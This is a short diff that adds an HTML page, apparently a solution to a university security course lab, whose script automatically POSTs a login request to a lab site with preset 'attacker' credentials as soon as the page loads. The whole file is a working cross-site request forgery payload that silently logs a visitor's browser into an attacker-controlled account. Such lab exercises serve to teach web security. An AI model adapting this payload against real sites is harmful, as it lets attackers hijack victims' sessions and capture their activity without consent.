@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        fetch("http://cpsc4200.mpese.com/login?csrfdefense=0&xssdefense=4", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: "username=attacker&password=l33th4x"
+        });
+    </script>
+</body>
+</html>
